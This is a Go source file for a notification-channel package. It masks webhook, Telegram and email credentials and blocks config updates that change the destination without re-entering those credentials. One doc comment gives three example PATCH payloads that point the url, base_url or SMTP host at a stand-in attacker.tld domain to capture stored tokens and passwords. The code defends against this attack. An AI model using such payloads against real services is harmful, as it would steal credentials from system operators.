package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks masked values. The API echoes credentials with this prefix;
// the update endpoint treats them as "keep the stored value unchanged".
//
// A prefix (not empty string) carries identifying info (see MaskedValue), so users can tell which bot without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original too short, no hint
//	"__masked__:…ab12cd"      includes last 6 chars as identification hint
//
// Exposing only the last 6 chars is deliberate: webhook identifying info is in the tail (WeCom key, Feishu
// bot id); the prefix is identical across bots. 6 chars can't reconstruct the credential but suffice to recognize the group.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (unmodified after API echo).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of config with credential fields replaced by masked values.
//
// Unknown channel types return an empty map — better "config unavailable" than echoing raw content that may
// contain credentials. Non-credential fields are preserved as-is so the UI can display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential: per-sub-key
		// rules would require each channel to declare which sub-keys are secrets.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "destination changed but caller did not express intent for
// credential fields". Returned instead of silently allowing or discarding credentials; see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys without explicit intent
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination (" + strings.Join(e.Changed, ", ") + ") changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or explicitly leave it empty to indicate that credentials are no longer needed." +
		"The old credentials are only valid for the old address; reusing them hands them over to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of "destination address change".
//
// It replaces bare MergeConfig on the channel update path, addressing a proven
// attack: destination (where messages go) and credentials (what identity sends)
// are independent field sets, and MergeConfig preserves stored values for
// "unmentioned keys". So anyone who can PATCH a channel can — by **only changing
// the address and staying silent on credentials** — make the server send real
// credentials to an attacker-controlled endpoint:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → raw Authorization header sent out
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username+password handed over after STARTTLS
//
// This path is silent, doesn't rely on redirects, and defeats the masking goal.
//
// Rule: when a destination key changes, the caller must explicitly express intent for **every** credential key:
//   - Provide a new value → use the new value
//   - Explicitly pass empty string → no longer needs credentials (preserve clear semantics)
//   - Echo back the masked value / omit the key → reject
//
// The third case is rejected because "masked value" means "reuse old credentials",
// and old credentials are only valid for the old address. Deliberately not
// auto-discarding — for optional credential fields that would silently become "auth gone but API returns 200".
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers is an object) embeds a masked literal, the caller
	// stuffed the "keep original" sentinel inside a struct. MergeConfig only recognizes "string with prefix" as
	// masked, so this form gets stored as a plain object — the literal "__masked__" lands in the DB, subsequent
	// auth silently fails. Better to reject.

	//
	// This check must be **at the very front**: when the address is unchanged it
	// takes an early return, so placing it after would only cover the "address
	// changed" path (the first version made exactly this mistake and the test caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that actually changed. Masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, do normal merge (masked keeps stored, empty clears, rest overwrites).

		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require explicit intent for each credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masked sentinel inside non-string structures.
//
// The masking mechanism's premise is "the entire value is a string". Object fields
// like webhook headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside an object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left entirely empty to keep the stored value, or submitted entirely with a new value; a mask placeholder must not be smuggled inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization
// handles type differences — frontend submits port as number, DB returns float64.
//
// "Empty" must be normalized before comparison: empty string and "key absent" are
// the same state, because MergeConfig treats empty string as explicit clear and
// deletes the key. Without normalization, an always-blank optional destination
// field (Telegram's base_url is the only such field: blank means use the official address) would take this path —
//
//	On creation, store base_url:""  →  first save deletes the key via MergeConfig
//	→ second save: incoming is "", stored lacks the key, judged as "address changed"
//	→ credential is masked value → 400 "destination changed, please re-enter credential fields"
//
// Every subsequent save fails unless the user re-pastes the Bot Token.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty".
// Must match MergeConfig's clear judgment (strings.TrimSpace(s) == ""),
// otherwise there'd be a gap where MergeConfig deletes but sameConfigValue sees a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - Masked values in incoming → keep stored value (user didn't change this field)
//   - Empty string in incoming → treat as explicit clear, delete the key; other keys → overwrite with incoming value
//   - Keys in stored but not in incoming → keep (partial update semantics)
//
// Empty string counts as "clear": the frontend form submits unfilled fields as
// empty strings. Treating them as valid values would clear fields where "leave
// blank to keep original" was intended. Explicit clear is chosen because when
// clearing a misconfigured field, the user has no other way to express it.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
